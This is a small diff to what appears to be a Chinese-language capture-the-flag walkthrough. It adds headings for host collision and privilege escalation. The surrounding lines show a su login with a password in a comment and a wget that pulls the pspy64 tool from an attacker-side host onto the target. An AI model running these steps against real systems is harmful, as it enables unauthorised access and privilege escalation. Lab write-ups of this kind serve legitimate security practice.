@@ -130,6 +130,7 @@ MariaDB [hidden]>
 
 ```
 
+# host碰撞
 
 使用host碰撞工具获取访问域名，记得在HostCollision-2.2.8/dataSource/下配置好域名和ip
 ```c
@@ -160,6 +161,7 @@ su qpmadmin //qpmpazzw
 
 ```
 
+# 提权
 上传pspy64查看root进程
 ```c
 qpmadmin@bah:~$ wget http://192.168.44.128:1234/pspy64
